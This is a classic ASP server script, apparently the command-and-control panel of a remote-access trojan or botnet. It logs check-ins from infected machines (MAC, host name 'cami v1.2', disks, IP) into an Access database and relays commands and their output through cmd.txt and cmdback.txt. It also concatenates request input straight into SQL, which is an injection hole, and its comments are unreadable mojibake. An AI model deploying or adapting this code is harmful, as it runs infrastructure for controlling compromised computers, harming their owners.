<%
'+++++++++++++++++++++++++++++++++++++
'// ���ã���¼���������������ص�ָ�� //
'+++++++++++++++++++++++++++++++++++++
On error resume next
Dim conns,connstr,mdbs
'############  Access���ݿ������ַ���  ###########
    mdbs=Rpath&"host.mdb"           '���ݿ��ļ�Ŀ¼
    Connstr="DRIVER=Microsoft Access Driver (*.mdb);DBQ="+server.mappath(mdbs)
Set Conn=Server.CreateObject("ADODB.Connection") 
    conn.Open connstr
'------------------------------------------==
 If Err Then
    Err.Clear
    Set Conns = Nothing
    Response.Write "err!"
    Response.End
 End If
'=++++++++++++++++++++++++++++++++++++++++=
%>


<%
'/////////////////////////////////////////////////////////////////////
Function getIP() 
Dim strIPAddr 
    strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR") 
 If strIPAddr = "" Then strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    getIP=strIPAddr
End Function

'/////////////////////////////////////////////////////////////////////
Function Nows()
   Nows=year(now)&"_"&month(now)&"_"&day(now)&"_"&hour(now)&"_"&minute(now)&"_"&second(now)
end Function 

'/////////////////////////////////////////////////////////////////////
Function FSOFileRead(filename) 
  Dim objFSO,objCountFile,FiletempData 
  Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
  Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True)
  if not objCountFile.AtEndofStream then 
      FSOFileRead = objCountFile.Readall
  end if
  objCountFile.Close 
  Set objCountFile=Nothing 
  Set objFSO = Nothing 
End Function

'/////////////////////////////////////////////////////////////////////
Function SysSaveFile(Strbody,LocalFileName) 
        On error resume next
		LocalFileName=server.MapPath(LocalFileName)
Set Fso =CreateObject("scripting.filesystemobject")
    If (Fso.fileexists(LocalFileName)) Then
    Set f =Fso.opentextfile(LocalFileName,2,true)
        f.Write Strbody
        f.Close
        Else
    Set f=Fso.opentextfile(LocalFileName,2,true)
        f.Write Strbody
        f.Close
    End If 
End Function
%>





<%
dim hostfile,cmdfile,cmdbackfile,cmdStr,cmd
	cmdfile    ="cmd.txt"
	cmdbackfile="cmdback.txt"
	cmdStr     ="*"
	
   ip   = getIP()
   mac  = request("mac")
   host = request("host")
   cmd  = request("cmd")
   disk = request("disk")
   
if host="" then host="cami v1.2"
   cmd=replace(cmd,"{-}",chr(13))
   
if mac<>"" then

if cmd="host" then
 '---------------  ��¼����  ---------------
   set rs=server.createobject("adodb.recordset")
       rs_sql="select * from host where mac='"&mac&"'"
       rs.open rs_sql,conn,1,3
	   if rs.eof then rs.addnew
	   if ip  <>"" then rs("ip")  =ip
	   if mac <>"" then rs("mac") =mac
	   if host<>"" then rs("host")=host
	   if disk<>"" then rs("disk")=disk
	   rs("update_time")  =now()
	   rs.update
	   rs.close
   set rs=nothing
elseif cmd<>"" then
 '---------------  ���շ�����Ϣ  -------------
	  SysSaveFile mac&"{#}"&cmd,cmdbackfile    '������Ϣ
	  SysSaveFile "ok!",cmdfile                    '������Ϣ���������
end if

end if
%>